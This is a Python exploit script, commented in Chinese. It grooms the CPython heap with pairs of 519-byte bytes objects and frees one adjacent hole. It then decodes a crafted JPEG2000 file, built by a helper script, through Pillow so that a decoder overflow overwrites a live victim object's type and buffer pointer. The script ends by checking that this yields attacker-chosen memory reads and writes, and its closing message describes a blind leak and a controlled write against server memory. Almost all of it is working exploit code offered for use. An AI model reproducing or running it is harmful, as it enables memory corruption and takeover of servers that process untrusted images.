#!/usr/bin/env python3
# 终版：只释放【一个】已验证相邻的 D 洞 => 数组必然落进它（0x230 档在解码中唯一）
#       => 写窗口覆盖其对偶 B（活对象），不触碰任何 chunk header => 不崩
import ctypes, gc, io, os, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
PY_BYTES_TYPE = 0xa22670

# ---- 1) 图案舞台 ----
PATTERN = bytes(((i * 7 + 33) & 0xFF) for i in range(64 * 64))
stage = bytearray(8192)
stage[0:len(PATTERN)] = PATTERN
SADDR = ctypes.addressof((ctypes.c_char * 8192).from_buffer(stage))
print("[*] SADDR=%#x 可表达=%s" % (SADDR, SADDR < 0x1000000))

# ---- 2) B 内容：519 字节（同档 0x230），预置 view.obj ----
raw = bytearray(519)
raw[0x20:0x28] = struct.pack('<Q', PY_BYTES_TYPE)
B_CONTENT = bytes(raw)

# ---- 3) 构造 A ----
r = subprocess.run(['python3', '/tmp/mk13.py', '/tmp/exp/base.j2k', '/tmp/A_pipe.jp2', '0', '23',
                    hex(0xa350c8), hex(0xa40000), hex(SADDR), '-370'], capture_output=True, text=True)
print("[*] A build:", (r.stdout + r.stderr).strip()[:60])
if 'OK' not in r.stdout:
    sys.exit(1)

# ---- 4) 预热该档 -> 喷射 -> 自验证 ----
gc.collect()
prime = [bytes(519) for _ in range(1024)]
del prime
pairs = []
for _ in range(600):
    D = bytes(519)
    B = bytes(bytearray(B_CONTENT))        # 强制新建
    pairs.append((D, B))
good = [(D, B) for (D, B) in pairs if id(B) - id(D) == 0x230]
print("[*] 相邻对 = %d / %d" % (len(good), len(pairs)))
if not good:
    sys.exit(0)

# ---- 5) 只放一个洞：其余 D 全部保持存活 ----
k = len(good) // 2
holeD, victimB = good[k]
good[k] = None
rest = [t for t in good if t is not None]
allB = [B for (D, B) in rest]
allD = [D for (D, B) in rest]
pairs = None
good = None
del holeD, pairs, good
gc.collect()
print("[*] 唯一空洞已释放；其余 %d 个 D 存活；受害 B = %#x" % (len(allD), id(victimB)))

# ---- 6) 读 A -> 解码 ----
A = open('/tmp/A_pipe.jp2', 'rb').read()
try:
    imA = Image.open(io.BytesIO(A)); imA.load()
    print("[*] 解码 A 完成:", imA.size)
except BaseException as e:
    print("[*] 解码 A 异常 %r" % (e,))

# ---- 7) 检查 ----
print("[*] victimB: type=%#x (期望 0xa350c8)  buf=%#x (期望 %#x)"
      % (R(id(victimB) + 8), R(id(victimB) + 0x38), SADDR))
if R(id(victimB) + 8) != 0xa350c8:
    other = [B for B in allB if R(id(B) + 8) == 0xa350c8]
    print("[-] victimB 未命中；其它命中数 =", len(other))
    if other:
        victimB = other[0]
        print("[+] 改用命中的 B: %#x  buf=%#x" % (id(victimB), R(id(victimB) + 0x38)))
    else:
        sys.exit(0)

# ---- 8) 管线以缓冲用法消费 ----
try:
    im2 = Image.frombytes('L', (64, 64), victimB)
    px = list(im2.getdata())
    print("[+] 前 8 像素:", px[:8], "  目标:", list(PATTERN[:8]))
    if px[:8] == list(PATTERN[:8]) and px[-8:] == list(PATTERN[-8:]):
        print("\n★★★ 成立：管线（缓冲用法）读到的是【我们指定地址】的内容")
        print("    => 指向服务器内存 = 盲泄露；让管线写 = 受控写")
except BaseException as e:
    print("[-] 消费异常 %r" % (e,))